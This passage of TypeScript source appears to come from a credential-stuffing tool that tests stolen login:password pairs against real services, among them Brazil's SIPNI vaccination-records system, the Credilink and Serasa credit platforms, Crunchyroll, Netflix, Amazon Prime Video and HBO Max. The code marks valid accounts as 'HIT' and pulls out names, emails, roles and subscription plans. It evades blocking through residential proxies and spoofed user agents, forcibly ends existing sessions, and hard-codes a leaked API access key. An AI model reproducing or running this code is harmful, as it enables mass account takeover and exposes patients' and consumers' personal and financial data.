      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html      = getResult.body;
    const viewState = extractViewState(html);
    const formId    = extractFormId(html);
    const submitId  = extractSubmitId(html, formId);
    const senhaHash = sha512(password);

    if (!formId || !submitId) {
      return { credential, login, status: "ERROR", detail: "NO_FORM_FOUND" };
    }

    // ── Step 2: Partial AJAX POST 1 (authenticate) ───────────────────────────
    const ajaxBody1 = [
      "javax.faces.partial.ajax=true",
      `javax.faces.source=${encodeURIComponent(submitId)}`,
      `javax.faces.partial.execute=${encodeURIComponent(submitId)}`,
      "javax.faces.behavior.event=click",
      "javax.faces.partial.event=click",
      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
      `javax.faces.ViewState=${encodeURIComponent(viewState)}`,
      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
      "AJAXREQUEST=_viewRoot",
    ].join("&");

    let post1: CurlResult;
    try {
      post1 = await runCurl([
        "-k", "--compressed",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "-H", `Origin: https://sipni.datasus.gov.br`,
        "-H", `Referer: ${SIPNI_URL}`,
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Faces-Request: partial/ajax",
        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
        "--data-raw", ajaxBody1,
        "--max-redirs", "0",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `AJAX1_ERROR:${String(e)}` };
    }

    const xml1 = post1.body;

    // Detect wrong credentials early
    if (xml1.toLowerCase().includes("usu") && xml1.toLowerCase().includes("ou senha inv")) {
      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos" };
    }
    if (xml1.toLowerCase().includes("acesso negado") || xml1.toLowerCase().includes("bloqueado")) {
      return { credential, login, status: "ERROR", detail: "BLOCK_AJAX1" };
    }

    // Extract updated ViewState from XML response
    let newViewState = viewState;
    const vsFromCData = xml1.match(/<update[^>]+javax\.faces\.ViewState[^>]*><!\[CDATA\[(.*?)\]\]><\/update>/);
    const vsFromAttr  = xml1.match(/id="javax\.faces\.ViewState"\s+value="([^"]+)"/);
    if (vsFromCData)    newViewState = vsFromCData[1];
    else if (vsFromAttr) newViewState = vsFromAttr[1];

    // ── Step 3: Partial AJAX POST 2 (complete login) ─────────────────────────
    const ajaxBody2 = [
      "javax.faces.partial.ajax=true",
      `javax.faces.source=${encodeURIComponent(submitId)}`,
      "javax.faces.partial.execute=%40all",
      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
      `javax.faces.ViewState=${encodeURIComponent(newViewState)}`,
      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
    ].join("&");

    let post2: CurlResult;
    try {
      post2 = await runCurl([
        "-k", "--compressed",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "-H", `Origin: https://sipni.datasus.gov.br`,
        "-H", `Referer: ${SIPNI_URL}`,
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Faces-Request: partial/ajax",
        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
        "--data-raw", ajaxBody2,
        "--max-redirs", "0",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `AJAX2_ERROR:${String(e)}` };
    }

    const xml2 = post2.body;

    // Detect wrong credentials (sometimes appears in step 2 as well)
    if (xml2.toLowerCase().includes("usu") && xml2.toLowerCase().includes("ou senha inv")) {
      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos_step2" };
    }

    // Extract redirect URL from XML: <redirect url="..."></redirect>
    const redirectMatch = xml2.match(/<redirect\s+url="([^"]+)"><\/redirect>/);
    const redirectUrl   = redirectMatch
      ? (redirectMatch[1].startsWith("/")
          ? `https://sipni.datasus.gov.br${redirectMatch[1]}`
          : redirectMatch[1])
      : null;

    if (!redirectUrl) {
      // No redirect in XML — might still be an inline failure
      const xml2Low = xml2.toLowerCase();
      if (xml2Low.includes("inicio.jsf") || xml2Low.includes("type=\"password\"") || xml2Low.includes("j_idt23:senha")) {
        return { credential, login, status: "FAIL", detail: "no_redirect_still_on_login" };
      }
      // Ambiguous — fall through to pacientes check
    }

    // ── Step 4: Verify access via pacientes page ──────────────────────────────
    // If we got a redirect URL that's not the login page, follow it
    // Then hit the pacientes URL to confirm session
    const targetUrl = redirectUrl && !redirectUrl.includes("inicio.jsf") ? redirectUrl : SIPNI_PACIENTES;
    let finalResult: CurlResult;
    try {
      finalResult = await runCurl([
        "-k", "-s",
        "-b", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-L",          // follow redirects
        "--max-redirs", "5",
        targetUrl,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `FINAL_GET_ERROR:${String(e)}` };
    }

    const finalText = finalResult.body.toLowerCase();

    // LIVE markers
    const liveMarkers = ["pacienteform", "pesquisa de paciente", "listapacientetable",
                         "nenhum paciente encontrado", "cartão sus", "cadastrar paciente"];
    for (const m of liveMarkers) {
      if (finalText.includes(m)) {
        return { credential, login, status: "HIT", detail: "sipni_dashboard" };
      }
    }

    // Heuristic: page is large and doesn't look like the login screen → likely a valid session
    if (finalResult.body.length > 5000 && !finalText.includes("type=\"password\"") && !finalText.includes("inicio.jsf")) {
      return { credential, login, status: "HIT", detail: "large_page_no_login_form" };
    }

    // DIE markers
    const dieMarkers = ["usuário ou senha inválidos", "senha incorreta", "sua sessão expirou",
                        "efetue o login", "problemas para se logar?", "j_idt23:senha", "j_idt26:senha"];
    for (const m of dieMarkers) {
      if (finalText.includes(m)) return { credential, login, status: "FAIL", detail: `die_marker:${m.slice(0,30)}` };
    }

    if (finalText.includes("type=\"password\"") || finalText.includes("inicio.jsf")) {
      return { credential, login, status: "FAIL", detail: "redirected_to_login" };
    }

    if (finalResult.body.length < 1000) {
      return { credential, login, status: "ERROR", detail: "response_too_short" };
    }

    return { credential, login, status: "FAIL", detail: "no_markers_found" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CREDILINK CHECKER — app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net
//  Logic: POST JSON → check idToken in response
//         Handle "UserHasSessionActive" by invalidating old session first.
// ═══════════════════════════════════════════════════════════════════════════════
const CREDILINK_AUTH_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net/credicorp/api/user/authenticate";
const CREDILINK_BASE_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net";
const CREDILINK_TIMEOUT  = 20_000;
const CREDILINK_PRODUCT  = "84";
const CREDILINK_KEY      = "YXRlbmFAcm9vdDphdGVuYUBCUTJhSiM2VEIyaWI=";

async function checkCrediLink(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const body       = JSON.stringify({
    login,
    password,
    productId:  CREDILINK_PRODUCT,
    accessKey:  CREDILINK_KEY,
    ip:         "0.0.0.0",
  });

  const attempt = async (): Promise<CurlResult> => runCurl([
    "-k", "-s",
    "-X", "POST",
    "-H", "Content-Type: application/json",
    "-H", `User-Agent: ${DESKTOP_UA}`,
    "-d", body,
    CREDILINK_AUTH_URL,
  ], CREDILINK_TIMEOUT);

  try {
    let result = await attempt();

    if (result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    let json: Record<string, unknown>;
    try { json = JSON.parse(result.body.trim()); }
    catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }

    // Handle "UserHasSessionActive" — invalidate old session then retry
    const details = Array.isArray(json.details) ? json.details as Record<string, unknown>[] : [];
    if (details[0]?.detailedMessage === "UserHasSessionActive") {
      const action = details[0]?.action as Record<string, string> | undefined;
      const href   = action?.href;
      const tk     = action?.temporaryToken;
      if (href && tk) {
        // Invalidate session
        await runCurl([
          "-k", "-s",
          "-X", "POST",
          "-H", `Authorization: Bearer ${tk}`,
          "-H", `User-Agent: ${DESKTOP_UA}`,
          `${CREDILINK_BASE_URL}/credicorp/api${href}`,
        ], CREDILINK_TIMEOUT).catch(() => void 0);
        // Retry auth
        result = await attempt();
        try { json = JSON.parse(result.body.trim()); }
        catch { return { credential, login, status: "ERROR", detail: "RETRY_INVALID_JSON" }; }
      }
    }

    // HIT: token received
    const idToken = json.idToken;
    if (idToken && typeof idToken === "string" && idToken.length > 0) {
      // Decode JWT payload for user info (base64url, no crypto needed)
      let detail = "token_ok";
      try {
        const parts  = idToken.split(".");
        const pad    = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
        const payload = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
        const name  = (payload.name ?? payload.nome ?? json.name ?? json.nome ?? "") as string;
        const email = (payload.email ?? json.email ?? "") as string;
        const role  = (payload.role ?? payload.perfil ?? payload.profile ?? "") as string;
        const parts2: string[] = [];
        if (name)  parts2.push(name.trim().slice(0, 40));
        if (email && email !== login) parts2.push(email.slice(0, 40));
        if (role)  parts2.push(`perfil:${String(role).slice(0, 20)}`);
        if (parts2.length) detail = parts2.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }

    // Common error codes
    const msg = String(json.message ?? json.erro ?? json.status ?? "").toLowerCase();
    if (msg.includes("invalid") || msg.includes("inválid") || msg.includes("incorret") || result.statusCode === 401) {
      return { credential, login, status: "FAIL", detail: `auth_failed:${msg.slice(0, 60)}` };
    }

    if (result.statusCode === 400 || result.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: `http_${result.statusCode}:${msg.slice(0, 60)}` };
    }

    return { credential, login, status: "FAIL", detail: result.body.trim().slice(0, 120) };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `CREDILINK_EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERASA EMPREENDEDOR CHECKER — https://www.serasaempreendedor.com.br/login
//  Original Python checker used Selenium (headless Chrome) because the main
//  Serasa page is a React SPA. HOWEVER, the OAuth redirect chain ends at the
//  identity-provider login page which IS server-rendered HTML (Keycloak/SSO).
//  Strategy:
//    Step 1: GET /login → follow ALL redirects → land on SSO HTML form page
//    Step 2: Extract form action URL + any hidden tokens from SSO HTML
//    Step 3: POST credentials to the form action URL (SSO server-side)
//    Step 4: Follow post-login redirects → detect dashboard vs error page
// ═══════════════════════════════════════════════════════════════════════════════
const SERASA_URL     = "https://www.serasaempreendedor.com.br/login";
const SERASA_TIMEOUT = 30_000;

async function checkSerasa(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/serasa_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page, follow all SSO redirects ─────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-k", "--compressed", "-L", "--max-redirs", "12",
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: none",
        SERASA_URL,
      ], SERASA_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html = getResult.body;

    // ── Detect if we have a server-rendered login form (SSO/Keycloak) ─────────
    const hasUsernameField = html.includes('id="username"') || html.includes("name=\"username\"") ||
                             html.includes("id='username'") || html.includes("name='username'");
    const hasPasswordField = html.includes('type="password"') || html.includes("type='password'");

    if (!hasUsernameField || !hasPasswordField) {
      // The page is still a JS-only SPA at this point — Selenium would be needed
      return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:js_only_login" };
    }

    // ── Extract the form action URL (Keycloak uses absolute URLs here) ────────
    const formActionMatch =
      html.match(/<form[^>]+action=["']([^"']+)["']/i) ||
      html.match(/action=["']([^"']+)["'][^>]*method=["']post["']/i);

    let formAction = formActionMatch?.[1] ?? "";
    if (!formAction) {
      return { credential, login, status: "ERROR", detail: "NO_FORM_ACTION" };
    }
    // Decode HTML entities (&amp; → &)
    formAction = formAction.replace(/&amp;/g, "&");
    // Resolve relative form action using the SSO domain from a known redirect pattern
    if (!formAction.startsWith("http")) {
      const ssoBase = getResult.headers["content-location"] ??
                      "https://www.serasaempreendedor.com.br";
      formAction = `${ssoBase.replace(/\/$/, "")}${formAction.startsWith("/") ? "" : "/"}${formAction}`;
    }

    // ── Extract hidden tokens (Keycloak session code, execution, etc.) ────────
    const hiddenInputs: Record<string, string> = {};
    const hiddenRe = /<input[^>]+type=["']hidden["'][^>]*>/gi;
    let hm: RegExpExecArray | null;
    while ((hm = hiddenRe.exec(html)) !== null) {
      const nameM  = hm[0].match(/name=["']([^"']+)["']/);
      const valueM = hm[0].match(/value=["']([^"']*?)["']/);
      if (nameM) hiddenInputs[nameM[1]] = valueM?.[1] ?? "";
    }

    // ── Step 2: POST credentials to SSO form action ───────────────────────────
    const postFields: Record<string, string> = {
      ...hiddenInputs,
      username: login,
      password,
      credentialId: "",
    };
    const postBody = Object.entries(postFields)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-k", "--compressed", "-L", "--max-redirs", "10",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `Referer: ${formAction}`,
        "-H", "Origin: https://www.serasaempreendedor.com.br",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: same-origin",
        "--data-raw", postBody,
        formAction,
      ], SERASA_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();

    // ── HIT markers (post-login dashboard) ────────────────────────────────────
    if (bLow.includes("bem-vindo ao nosso tour") || bLow.includes("comprar créditos") ||
        bLow.includes("comprar creditos") || bLow.includes("meu perfil") ||
        bLow.includes("consultas realizadas") || bLow.includes("créditos disponíveis") ||
        bLow.includes("saldo disponível") || bLow.includes("painel")) {
      return { credential, login, status: "HIT", detail: "serasa_dashboard" };
    }

    // ── FAIL markers ──────────────────────────────────────────────────────────
    if (bLow.includes("verifique se o usu") || bLow.includes("senha foram digitados") ||
        bLow.includes("usuário ou senha incorretos") || bLow.includes("credenciais inválidas") ||
        bLow.includes("invalid credentials") || bLow.includes("invalid_grant") ||
        bLow.includes("account is disabled") || bLow.includes("user not found")) {
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    }

    // ── Still on SSO login page (wrong creds but no explicit message) ─────────
    if ((bLow.includes('id="username"') || bLow.includes("name=\"username\"")) &&
        bLow.includes('type="password"')) {
      return { credential, login, status: "FAIL", detail: "still_on_login_page" };
    }

    if (body.length < 500) {
      return { credential, login, status: "ERROR", detail: "response_too_short" };
    }

    return { credential, login, status: "FAIL", detail: "unknown_response" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CRUNCHYROLL CHECKER — OAuth2 password grant via Android client
//  Routed through residential proxy (cloud IPs blocked / DNS fails)
//  POST https://auth.crunchyroll.com/auth/v1/token
// ═══════════════════════════════════════════════════════════════════════════════
const CR_CLIENT_B64  = Buffer.from("cr_android2:").toString("base64");
const CR_UA          = "Crunchyroll/3.46.2 Android/13 okhttp/4.12.0";
const CR_TIMEOUT     = 25_000;

async function checkCrunchyroll(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    const result = await runCurlWithProxyRetry(px => [
      "--compressed", "-L", "--max-redirs", "3",
      ...px,
      "-H", `User-Agent: ${CR_UA}`,
      "-H", `Authorization: Basic ${CR_CLIENT_B64}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "--data-raw", `grant_type=password&username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}&scope=offline_access`,
      "https://auth.crunchyroll.com/auth/v1/token",
    ], CR_TIMEOUT, 3);

    if (result.statusCode === 200 && result.body.includes("access_token")) {
      let detail = "authenticated";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        const parts: string[] = [];
        if (j.account_id)   parts.push(`uid:${j.account_id}`);
        if (j.country)      parts.push(`país:${j.country}`);
        // Decode access_token JWT for subscription tier
        if (typeof j.access_token === "string") {
          try {
            const pad     = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
            const tkParts = (j.access_token as string).split(".");
            const tkPay   = JSON.parse(Buffer.from(pad(tkParts[1]), "base64").toString("utf8")) as Record<string, unknown>;
            const tier    = tkPay.subscription_type ?? tkPay.tier ?? tkPay.plan ?? "";
            if (tier) parts.push(`plano:${String(tier).slice(0, 20)}`);
            const email = tkPay.email ?? "";
            if (email && String(email) !== login) parts.push(String(email).slice(0, 40));
          } catch { /**/ }
        }
        if (parts.length) detail = parts.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (result.statusCode === 401 || result.statusCode === 400) {
      let detail = "invalid_credentials";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        const e = j.error ?? j.code ?? "";
        if (e) detail = String(e).slice(0, 60);
      } catch { /**/ }
      return { credential, login, status: "FAIL", detail };
    }
    const bLow = result.body.toLowerCase();
    if (bLow.includes("account_not_found") || bLow.includes("user_not_found"))
      return { credential, login, status: "FAIL", detail: "account_not_found" };
    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    if (bLow.includes("blocked") || result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${result.body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  NETFLIX CHECKER — Extract BUILD_IDENTIFIER → POST to Shakti API
//  Works directly (no proxy needed — Netflix accessible from datacenter IPs)
// ═══════════════════════════════════════════════════════════════════════════════
const NF_TIMEOUT = 35_000;

async function checkNetflix(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/nf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    // Step 1 — GET login page, extract BUILD_IDENTIFIER + authURL (no proxy needed)
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "5",
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "https://www.netflix.com/br/login",
      ], NF_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    const html = getResult.body;
    const buildMatch = html.match(/"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"/);
    if (!buildMatch) {
      if (html.length < 200) return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
      return { credential, login, status: "ERROR", detail: "NO_BUILD_ID" };
    }
    const buildId = buildMatch[1];
    // Decode JSON string escapes: \/ → / , \xNN → char, \uNNNN → char
    const rawAuth = (html.match(/"authURL"\s*:\s*"([^"]+)"/) ?? [])[1] ?? "";
    const authURL = rawAuth
      .replace(/\\\//g, "/")
      .replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)))
      .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));

    // Step 2 — POST credentials to Shakti API
    // Netflix Shakti blocks datacenter IPs with 421 — use proxy with automatic retry
    const nfBody = JSON.stringify({
      userLoginId: login, password, rememberMe: true,
      flow: "websiteSignUp", mode: "login", action: "loginAction",
      withFields: "rememberMe,nextPage,userLoginId,password,countryCode,currentFlowContext",
      authURL, nextPage: "", showPassword: "",
    });
    let postResult: CurlResult;
    try {
      postResult = await runCurlWithProxyRetry(px => [
        "--compressed", "--http1.1", "-L", "--max-redirs", "3",
        ...px,
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/json",
        "-H", "Referer: https://www.netflix.com/br/login",
        "-H", "Origin: https://www.netflix.com",
        "-H", "Accept: application/json, text/javascript",
        "-H", "X-Netflix.is.user.unauthenticated: true",
        "--data-raw", nfBody,
        `https://www.netflix.com/api/shakti/${buildId}/login`,
      ], NF_TIMEOUT, 3);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();
    if (bLow.includes('"result":"login"') || bLow.includes('"membertype"') || bLow.includes('"account":')) {
      let detail = "netflix_authenticated";
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const res = (j.result === "login" ? j : j) as Record<string, unknown>;
        // Extract from top-level or nested customerData/account
        const member = (res.membershipStatus ?? (res.customerData as Record<string, unknown>)?.membershipStatus ?? "") as string;
        const plan   = (res.planName       ?? (res.customerData as Record<string, unknown>)?.planName ?? "") as string;
        const country= (res.countryOfSignup ?? (res.customerData as Record<string, unknown>)?.countryOfSignup ?? "") as string;
        const parts: string[] = [];
        if (member && member !== "CURRENT_MEMBER") parts.push(member.toLowerCase());
        else if (member) parts.push("ativo");
        if (plan)    parts.push(`plano:${plan.slice(0, 25)}`);
        if (country) parts.push(`país:${country}`);
        if (parts.length) detail = parts.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (bLow.includes("incorretemailpassword") || bLow.includes("incorrect_password") ||
        bLow.includes("invalidpassword") || bLow.includes("emailfield.invalidemailaddress") ||
        bLow.includes("invalid_email_or_password"))
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    if (bLow.includes("too many") || bLow.includes("rate limit"))
      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
    if (postResult.statusCode === 421)
      return { credential, login, status: "ERROR", detail: "RESIDENTIAL_IP_REQUIRED:shakti_421" };
    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  AMAZON PRIME VIDEO CHECKER — Form scrape → POST signin (residential proxy)
// ═══════════════════════════════════════════════════════════════════════════════
const AMZ_TIMEOUT = 35_000;
const AMZ_SIGNIN  = "https://www.amazon.com.br/ap/signin?openid.pape.max_auth_age=0"
  + "&openid.return_to=https%3A%2F%2Fwww.amazon.com.br%2F"
  + "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
  + "&openid.assoc_handle=braflex&openid.mode=checkid_setup"
  + "&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
  + "&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&_encoding=UTF8";

async function checkAmazonPrime(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/amz_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    let getResult: CurlResult;
    try {
      getResult = await runCurlWithProxyRetry(px => [
        "--compressed", "-L", "--max-redirs", "5",
        ...px,
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        AMZ_SIGNIN,
      ], AMZ_TIMEOUT, 3);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    const html = getResult.body;
    if (html.length < 500 || getResult.statusCode === 0)
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };

    // Extract hidden CSRF/openid fields
    const hiddenInputs: Record<string, string> = {};
    const hiddenRe = /<input[^>]+type=["']?hidden["']?[^>]*>/gi;
    let hm: RegExpExecArray | null;
    while ((hm = hiddenRe.exec(html)) !== null) {
      const nameM  = hm[0].match(/name=["']([^"']+)["']/);
      const valueM = hm[0].match(/value=["']([^"']*?)["']/);
      if (nameM) hiddenInputs[nameM[1]] = (valueM?.[1] ?? "").replace(/&amp;/g, "&");
    }

    const formActionMatch = html.match(/<form[^>]+action=["']([^"']+)["']/i);
    const rawAction = formActionMatch?.[1] ?? AMZ_SIGNIN;
    const formAction = rawAction.startsWith("http")
      ? rawAction : `https://www.amazon.com.br${rawAction}`;

    const postBody = Object.entries({ ...hiddenInputs, email: login, password, signin: "" })
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    let postResult: CurlResult;
    try {
      postResult = await runCurlWithProxyRetry(px => [
        "--compressed", "-L", "--max-redirs", "8",
        ...px,
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `Referer: ${AMZ_SIGNIN}`,
        "-H", "Origin: https://www.amazon.com.br",
        "--data-raw", postBody,
        formAction,
      ], AMZ_TIMEOUT, 3);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();
    if (bLow.includes("olá,") || bLow.includes("minha conta") || bLow.includes("logout") ||
        bLow.includes("prime video") || bLow.includes("conta &amp; listas") ||
        (postResult.statusCode === 200 && !bLow.includes("ap/signin") && bLow.includes("amazon.com.br"))) {
      let detail = "amazon_authenticated";
      try {
        // "Olá, NOME" pattern in the HTML
        const nameMatch = body.match(/Olá,\s*([^<\n]{2,50})/i) ||
                          body.match(/Hello,\s*([^<\n]{2,50})/i) ||
                          body.match(/class="[^"]*nav-line-1[^"]*"[^>]*>\s*([^<]{2,50})/i);
        if (nameMatch) detail = `logado:${nameMatch[1].trim().slice(0, 50)}`;
        // Prime membership indicator
        if (bLow.includes("prime video") || bLow.includes("amazon prime")) {
          detail += " | prime:sim";
        }
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (bLow.includes("senha incorreta") || bLow.includes("e-mail ou senha incorretos") ||
        bLow.includes("incorrect password") || bLow.includes("há um problema"))
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    if (bLow.includes("ap/signin") || bLow.includes("auth-email"))
      return { credential, login, status: "FAIL", detail: "still_on_signin" };
    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MAX (HBO MAX) CHECKER — OAuth2 password grant via Max mobile API
//  Routed through residential proxy.
//  The old oauth.api.hbo.com endpoint is dead since the Max rebrand (2023).
//  New endpoint: https://api.max.com/v1/oauth/token
// ═══════════════════════════════════════════════════════════════════════════════
const HBO_TIMEOUT = 25_000;
const HBO_UA      = "Max/61.0.1.1 (Android 13; Build/TQ3A.230901.001; Phone)";
// Max Android client_id (embedded in the app APK)
const MAX_CLIENT_ID = "max-mobile-android";

async function checkHBOMax(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    const payload = JSON.stringify({
      grant_type: "password",
      username:   login,
      password,
      client_id:  MAX_CLIENT_ID,
    });

    const result = await runCurlWithProxyRetry(px => [
      "--compressed", "-L", "--max-redirs", "3",
      ...px,
      "-H", `User-Agent: ${HBO_UA}`,
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "--data-raw", payload,
      "https://api.max.com/v1/oauth/token",
    ], HBO_TIMEOUT, 3);

    if (result.statusCode === 200 && result.body.includes("access_token")) {
      let detail = "max_authenticated";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        // Decode JWT access_token for subscriber info
        if (typeof j.access_token === "string") {
